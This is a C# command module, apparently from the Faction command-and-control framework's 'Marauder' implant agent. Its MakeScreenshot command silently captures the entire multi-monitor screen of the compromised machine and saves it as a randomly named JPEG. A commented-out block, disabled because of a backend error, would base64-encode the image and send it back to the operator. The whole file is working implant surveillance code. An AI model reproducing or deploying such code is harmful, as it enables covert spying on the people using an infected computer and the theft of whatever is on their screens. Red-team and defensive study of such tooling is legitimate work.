using System;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.Collections.Generic;
using Faction.Modules.Dotnet.Common;
using System.IO;

namespace Faction.Modules.Dotnet.Commands
{
    class MakeScreenshot : Command
    {
        public override String Name { get { return "MakeScreenshot"; } }
        public override CommandOutput Execute(Dictionary<String, String> Parameters)
        {
            CommandOutput output = new CommandOutput();
            try
            {
                // Determine the size of the "virtual screen", which includes all monitors.
                int screenLeft = SystemInformation.VirtualScreen.Left;
                int screenTop = SystemInformation.VirtualScreen.Top;
                int screenWidth = SystemInformation.VirtualScreen.Width;
                int screenHeight = SystemInformation.VirtualScreen.Height;

                string path = RandomString() + ".jpg";

                // Create a bitmap of the appropriate size to receive the screenshot.
                using (Bitmap bmp = new Bitmap(screenWidth, screenHeight))
                {
                    // Draw the screenshot into our bitmap.
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
                    }

                    // Do something with the Bitmap here, like save it to a file:
                    bmp.Save(path, ImageFormat.Jpeg);
                }

                //Upload screenshot after is has been taken
                long length = new FileInfo(path).Length;
                output.Complete = true;

                output.Message += $"\nScreenshot created - ToDo: Implement auto upload.";
                /*
                 * The upload from the screenshot should be possible with the code below
                 * Since the creator of faction is currently reworking the backend, the API responds with a 500 error, therefore the code is currently not implemented.
                 * 
                byte[] fileBytes = File.ReadAllBytes(path);
                output.Message = $"{path} has been uploaded";
                output.Type = "File";
                output.Content = Convert.ToBase64String(fileBytes);
                output.ContentId = path;

                output.Success = true;
                output.Message += $"\nScreenshot was saved in the same directory as the Marauder agent!";
                */
                 
            }
            catch (Exception ex)
            {
                output.Complete = true;
                output.Success = false;
                output.Message = ex.Message;
            }

            return output;
        }

        private string RandomString()
        {
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var stringChars = new char[8];
            var random = new Random();

            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }
            var finalString = new String(stringChars);

            return finalString;
        }

    }
}
